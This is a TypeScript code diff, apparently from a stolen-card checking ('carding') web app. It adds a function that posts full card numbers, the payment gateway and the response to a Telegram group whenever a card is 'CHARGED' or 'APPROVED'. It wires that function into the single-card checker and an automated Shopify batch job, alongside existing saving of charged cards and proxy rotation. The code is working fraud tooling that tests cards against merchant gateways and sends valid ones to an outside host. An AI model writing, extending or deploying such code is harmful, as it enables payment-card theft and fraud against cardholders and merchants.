@@ -93,6 +93,34 @@ function saveCfConfig(cfg: { cfOnly: boolean }) {
   try { fs.writeFileSync(CF_CONFIG_PATH, JSON.stringify(cfg, null, 2)); } catch {}
 }
 
+function sendLogsGroupTelegram(card: string, gateway: string, response: string, status: string, userName: string, userId: string) {
+  try {
+    const cfg = JSON.parse(fs.readFileSync(path.join(process.cwd(), "bot", "config.json"), "utf-8"));
+    const botToken = (cfg.TELEGRAM_BOT_TOKEN || "").trim();
+    const logsGroupId = String(cfg.logs_group_id || "").trim();
+    if (!botToken || !logsGroupId || logsGroupId === "0" || logsGroupId === "") return;
+    const statusUpper = (status || "").toUpperCase();
+    const icon = statusUpper === "CHARGED" ? "\uD83D\uDD25" : statusUpper === "APPROVED" ? "\u2705" : "\u274C";
+    const lines = [
+      `${icon} [${statusUpper}] Log`,
+      `\uD83D\uDC64 ${userName || userId}`,
+      `\uD83D\uDCB3 Card: <code>${card}</code>`,
+      `\u2194\uFE0F Gateway: ${gateway || ""}`,
+      `\uD83D\uDCDD Response: ${response || ""}`,
+    ];
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: parseInt(logsGroupId),
+        text: lines.join("\n"),
+        parse_mode: "HTML",
+        disable_web_page_preview: true,
+      }),
+    }).catch(() => {});
+  } catch {}
+}
+
 // Module-level proxy cache (lifted from the inner closure to enable caching)
 const _userProxiesPath = path.join(path.resolve(process.cwd(), "bot"), "user_proxies.json");
 let _userProxiesCache: Record<string, { proxies: string[] }> | null = null;
@@ -837,6 +865,11 @@ export async function registerRoutes(
     if (hitStatus === "CHARGED") {
       try {
         saveChargedCC(card, gateway, String(userId), userName);
+      } catch {}
+    }
+    if (hitStatus === "CHARGED" || hitStatus === "APPROVED") {
+      try {
+        sendLogsGroupTelegram(card, gateway, response || status, hitStatus, userName, String(userId));
       } catch {}
     }
     res.json({ ok: true });
@@ -1612,6 +1645,7 @@ export async function registerRoutes(
             const userName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.username || req.session.userId;
             sendGroupLog(userName, req.session.userId, cardClean, gateway, responseStr, "checker");
             saveChargedCC(cardClean, gateway, req.session.userId, userName);
+            sendLogsGroupTelegram(cardClean, gateway, responseStr, parsed.status === "charged" ? "CHARGED" : "APPROVED", userName, req.session.userId);
             addActivity({
               type: "hit",
               userName,
@@ -1774,6 +1808,7 @@ export async function registerRoutes(
           if (isBatchHit) {
             sendGroupLog(job.userName, job.userId, card, job.gateway, resultResponse, "auto_shopify");
             saveChargedCC(card, job.gateway, job.userId, job.userName);
+            sendLogsGroupTelegram(card, job.gateway, resultResponse, result.status === "charged" ? "CHARGED" : "APPROVED", job.userName || job.userId, job.userId);
             addActivity({
               type: "hit",
               userName: job.userName,
